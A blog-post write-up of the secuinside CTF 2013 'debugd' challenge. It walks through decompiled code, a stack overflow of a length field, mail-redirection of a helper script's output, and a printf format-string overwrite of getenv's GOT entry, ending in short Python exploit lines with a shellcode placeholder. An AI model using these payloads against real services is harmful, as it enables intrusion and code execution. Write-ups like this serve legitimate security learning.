---
title: secuinside CTF 2013 Quals debugd writeup
author: scdeny
layout: post
permalink: /secuinside-ctf-debugd-writeup/
categories:
  - CTF
  - writeup
---
debugd is a 32-bit ELF, after open with IDA, we found function “service”:

    senddata(fd, "1. gdb vuln\n");
    senddata(fd, "2. objdump vuln\n");
    senddata(fd, "3. memory info\n");
    senddata(fd, "4. Report to admin\n");
    senddata(fd, "5. Exit\n");
    recvdata(fd, s1, 3, 10);
    

if we type 4, report() is call, the code is below:

    senddata(fd, "Title : ");
    recvdata(fd, title, 60, 10);
    senddata(fd, "Contents : ");
    recvdata(fd, contents, buff_len, 10);
    sprintf(command, "/home/solve1/script.py %s %s %s %s", contents, email, hello, title);
    if ( strchr(command, '`')
        || strchr(command, '|')
        || strchr(command, '&amp;')
        || strchr(command, '\'')
        || strchr(command, '"')
        || strchr(command, ';')
        || strchr(command, '(')
        || strchr(command, '{') )
    {
        senddata(fd, "Nope\n");
        result = 0;
    }
    else
    {
        popen(command, "r");
        content_len = strlen(contents);
        printf("%d\n%d\n%s\n%s\n%s\n", buff_len, content_len, email, hello, contents);
        senddata(fd, "Mail Sended\n");
        result = 0;
    }
    

Function report() ask us to input Title(60 bytes), Contents and then execute &#8220;/home/solve1/script.py&#8221;.

    size_t content_len; // eax@10
    char contents[256]; // [sp+2Ch] [bp-66Ch]@1
    char email[40]; // [sp+12Ch] [bp-56Ch]@1
    char hello[8]; // [sp+154h] [bp-544h]@1
    char v6[248]; // [sp+15Ch] [bp-53Ch]@1
    char command[1024]; // [sp+254h] [bp-444h]@1
    char title[56]; // [sp+654h] [bp-44h]@1
    int buff_len; // [sp+68Ch] [bp-Ch]@1
    

We found title is 56 bytes long, but we can input 60 bytes, so the last 4 bytes can overwrite buff_len. Then we can input as long Contents as we wanted. if contents is long enough, it can overwrite email[40], hello[8], v6[246], but not command. because if the last byte of v6[246] is not null, sprintf will get into circulation of move command to command.

In script.py, it execute /home/solve1/vuln, with argument argv[3], which is hello[8] from debugd. And then send the output of vuln to email argv[2], which is email[40] from debugd. The code is follow:

    to = sys.argv[2]
    msg = MIMEText(data)
    msg['subject'] = "hello"
    msg['From'] = sender
    msg['To'] = to
    
    data = os.popen("/home/solve1/vuln "+"'"+sys.argv[3]+"'").read()
    

From the vulnarability of debugd, wo can construct the the parameter to vuln, and change the email destination to ours.

We can type 2 to dump the assembly code of vuln, the main() function is very simple, after copy argv&#91;1] to local buffer [sep+0x20&#93;(this buffer is 0x100 byte long, and strncpy's third parameter specify the maxlen to 0x100), then it copy argv[1] to global buffer 0x804a060, and call printf function to print the buffer [esp+0x20], the all code is below:

    push   %ebp
    mov    %esp,%ebp
    and    $0xfffffff0,%esp
    sub    $0x120,%esp
    mov    0x8(%ebp),%eax
    mov    %al,0x1c(%esp)           ;argc
    mov    0xc(%ebp),%eax           ;argv
    add    $0x4,%eax
    mov    (%eax),%eax              ;argv[1]
    movl   $0x100,0x8(%esp)
    
    mov    %eax,0x4(%esp)
    lea    0x20(%esp),%eax
    mov    %eax,(%esp)
    call   8048370  ;argv[1]-&gt;esp+20
    mov    0xc(%ebp),%eax
    add    $0x4,%eax
    mov    (%eax),%eax
    movl   $0x100,0x8(%esp)
    
    mov    %eax,0x4(%esp)
    movl   $0x804a060,(%esp)
    call   8048370  ;argv[1]-&gt;0x804a060
    lea    0x20(%esp),%eax
    mov    %eax,(%esp)
    call   8048330      ;printf(esp+20)
    movl   $0x804a060,(%esp)
    call   8048340      ;getenv(0x804a060)
    mov    $0x0,%eax
    leave  
    ret
    

We can use the format vulnarability of printf to overwrite the got table of getenv() to execute our shell code, the exploit code is as follow:

    sock.send('4\x0A')
    print sock.recv(1024)
    sock.send('a'*56+'\x01\x01\x01\x40')
    print sock.recv(1024)
    sock.send("a"+"\x00"*255+myemail+"\x00"*(40-myemail)+"\x12\xa0\x04\x08"+"\x10\xa0\x04\x08"+"%2044u%8\$hn%39035u%9\$hn"+shellcode+"\x0A")